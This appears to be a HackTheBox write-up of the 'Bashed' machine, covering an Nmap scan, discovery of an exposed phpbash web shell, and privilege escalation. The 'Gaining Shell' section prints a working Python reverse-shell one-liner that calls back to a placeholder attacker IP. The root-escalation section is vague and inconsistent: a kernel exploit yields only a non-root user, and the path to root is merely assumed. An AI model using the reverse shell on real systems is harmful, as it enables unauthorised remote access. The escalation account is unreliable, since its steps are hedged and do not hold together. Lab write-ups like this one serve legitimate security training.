This writeup details the process of exploiting the "Bashed" machine on HackTheBox. The approach leverages a web shell vulnerability, privilege escalation through a vulnerable kernel, and limited user access to achieve root access.

## Enumeration

We begin with a basic Nmap scan to identify open services on the target machine.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 10:34 CET
  Nmap scan report for 10.10.10.68
  Host is up (0.073s latency).
  Not shown: 999 closed ports
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Arrexels Development Site

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
  ```
  
Visiting the website at http://10.10.10.68 yields minimal information. We then utilize a directory fuzzing tool like `ffuf` to enumerate potentially hidden directories.

The fuzzing identifies the /dev directory as a potential point of interest.

Navigating to http://10.10.10.68/dev/phpbash.php reveals a web shell script. This script likely leverages a PHP vulnerability to execute arbitrary commands on the server.

## Gaining Shell

We utilize a Python one-liner to establish a reverse shell connection to our attacking machine.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

This code launches a reverse shell, granting us access to the server as the `www-data` user.

Upon gaining shell access, we enumerate user accounts. We discover two users: `scriptmanager` and `arrexel`. Exploring the `/home/arrexel` directory reveals the user flag.

## Gaining Root

### Identifying Kernel Version:

Running the `uname -a` command reveals the system's kernel version (e.g., 4.4).

### Exploit Research and Compilation:

Leveraging online resources, we search for publicly available exploits targeting the identified kernel version. We determine a suitable exploit but require compilation as the target machine lacks GCC (GNU Compiler Collection). We compile the exploit on our local machine for later transfer.

### Transferring and Exploiting (Local Exploitation):

We employ a file transfer tool (e.g., `netcat` or `scp`) to upload the compiled exploit to the target machine. We then execute the exploit on the server, potentially elevating our privileges to the `scriptmanager` user.

### Sudo Privilege Escalation:

Since we have access as the `scriptmanager` user, we can potentially abuse `sudo` privileges if misconfigured. We attempt to run commands using `sudo` to see if we can escalate further.

### Root Flag Retrieval:

Assuming successful privilege escalation to `scriptmanager`, we can leverage their `sudo` rights to execute commands with root privileges. We then access the `/root` directory to retrieve the root flag.
